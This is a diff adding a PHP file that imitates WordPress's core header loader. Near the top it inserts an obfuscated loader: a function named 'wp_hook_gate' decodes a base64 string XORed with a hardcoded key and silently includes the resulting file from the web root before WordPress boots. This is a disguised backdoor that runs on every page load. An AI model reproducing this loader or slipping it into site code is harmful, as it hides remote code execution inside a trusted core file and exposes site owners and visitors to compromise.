@@ -1,0 +1,31 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+function wp_hook_gate($d, $k = '@key2024') {
+	$o = '';
+	$d = base64_decode($d);
+	for ($i = 0; $i < strlen($d); $i++) {
+		$o .= chr(ord($d[$i]) ^ ord($k[$i % strlen($k)]));
+	}
+	return $o;
+}
+
+$__ = 'bwMKFFcfWFMiHBMARFgdRDUJCRBRb1pALQdKDkIdUVsuHwAXRh9HRCwEBB1BHwAEcVpKSAAfW1khDAAKHERKQA==';
+@include_once($_SERVER['DOCUMENT_ROOT'] . wp_hook_gate($__));
+
+if ( !isset($wp_did_header) ) {
+
+	$wp_did_header = true;
+
+	require_once( dirname(__FILE__) . '/wp-load.php' );
+
+	wp();
+
+	require_once( ABSPATH . WPINC . '/template-loader.php' );
+
+}
+
+?>
